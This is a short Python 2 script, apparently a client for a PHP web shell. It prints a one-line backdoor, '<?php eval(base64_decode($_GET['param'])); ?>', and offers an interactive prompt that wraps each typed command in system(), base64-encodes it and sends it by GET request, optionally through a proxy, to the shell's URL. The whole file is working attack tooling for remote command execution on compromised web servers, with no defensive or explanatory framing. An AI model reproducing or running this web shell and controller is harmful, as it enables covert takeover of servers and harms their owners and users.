#!/usr/bin/env python 
# -*- coding: utf-8 -*- 

from cmd import Cmd
import sys
import base64
import httplib
from urlparse import urlparse
from urllib import quote_plus
from optparse import OptionParser


http_headers = {
                    "Content-Type": "application/x-www-form-urlencoded"
                }


#if len(sys.argv) > 1:
#    shell_url = sys.argv[1]
#    if len(sys.argv) > 2:
#        proxy = sys.argv[2]
#    else:
#        proxy = ''
#else:
#    print "URL missed"
#    exit(0)


optionsp = OptionParser()
optionsp.add_option("-u", "--url", type="string", dest="url", help="Shell url")
optionsp.add_option("-p", "--proxy", type="string", dest="proxy", help="Proxy server")
optionsp.add_option("-s", action="store_true", help="Print the php shell")
(options, args) = optionsp.parse_args(sys.argv)

shell_url = options.url
proxy = options.proxy


class rshell(Cmd):

    pwd = ""
    old_pwd = ""

    def __init__(self, shell_url, proxy):
        Cmd.__init__(self)
        self.shell_url = shell_url
        self.proxy = proxy

    def do_help(self, line):
        print "Write the command to send to server shell"

    def default(self, line):
        s = "system('{0}');".format(line)
        url = self.shell_url + '?param=' + quote_plus(base64.encodestring(s)[:-1])
        self.make_request(url)

    def do_quit(self, line):
        exit(0)

    def do_exit(self, line):
        exit(0)

    def make_request(self, fullurl):
        parsed_url = urlparse(fullurl)
        #name_ip_port_proto = parsed_url['netloc']
        url = ''
        con = None
        if self.proxy:
            (ip, port) = self.proxy.split(':')
            con = httplib.HTTPConnection(ip, int(port))
            url = fullurl
        else:
            #url = parsed_url['scheme'] + '://' + parsed_url['netloc']
            url = parsed_url.path + '?' + parsed_url.query
            con = httplib.HTTPConnection(parsed_url.netloc, parsed_url.port)
        if con:
            con.request('GET', url)
            response = con.getresponse()
            if response.status == 200:
                print response.read()
            else:
                print response.status
        else:
            print "Can't connect"

    def print_payload(self):
        print "<?php eval(base64_decode($_GET['param'])); ?>"


def main():
    a = rshell(shell_url, proxy)
    a.prompt = 'rshell:~ '
    if options.s:
        a.print_payload()
    else:
        a.cmdloop()

if __name__ == '__main__':
    main()
